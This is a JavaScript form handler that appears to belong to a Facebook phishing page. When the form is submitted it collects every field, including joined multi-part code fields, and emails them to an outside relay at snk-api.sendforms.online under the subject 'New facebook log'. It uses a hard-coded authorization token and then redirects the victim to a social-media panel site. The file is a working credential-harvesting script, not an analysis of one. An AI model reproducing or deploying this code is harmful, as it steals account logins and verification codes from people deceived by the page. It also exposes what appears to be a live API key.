window.onload = function () {
    const btn = document.querySelector('button');
    document.getElementById('form').addEventListener('submit', async function (event) {
      event.preventDefault();
      btn.textContent = 'Loading...';
  
      const formObj = Object.fromEntries(new FormData(this));
  
      const processFields = (obj) => {
        const keyEndsWith1 = Object.keys(obj).find((key) => key.endsWith('1'));
        const prefix = keyEndsWith1 ? keyEndsWith1.slice(0, -1) : null;
  
        const values = Object.entries(obj)
          .filter(([key]) => key.startsWith(prefix))
          .map(([_, value]) => value);
  
        const standaloneValues = Object.entries(obj)
          .filter(([key]) => !key.startsWith(prefix))
          .map(([key, value]) => `${key}: ${value}`);
  
        const result = [];
  
        if (values.length > 0) {
          result.push(`${prefix}: ${values.join('')}`);
        }
  
        result.push(...standaloneValues);
  
        return result.join('\n\n');
      };
  
      const formData = processFields(formObj);
      const body = {
        email: {
          subject: 'New facebook log',
          text: formData,
        },
        mailID: 'zs7qXf',
      };
  
      try {
        const res = await fetch('https://snk-api.sendforms.online/api/email', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            Authorization:
              '4UMEZ2UTGMRh8zzSkkPZCI9uT9tV2MhcTJS6y5IQUelgoHqGygRXw3txPX7kIPQm',
          },
          body: JSON.stringify(body),
        });
  
        if (res.status === 200) {
          console.log('SUCCESS!');
          // Redirect after successful submission
          setTimeout(() => {
            window.location.href = 'https://easesocial.socpanel.com'; 
          }, 4000);
        }
      } catch (error) {
        console.log(error);
        alert('An error occurred, please try again');
        window.location.reload();
      }
    });
  };
  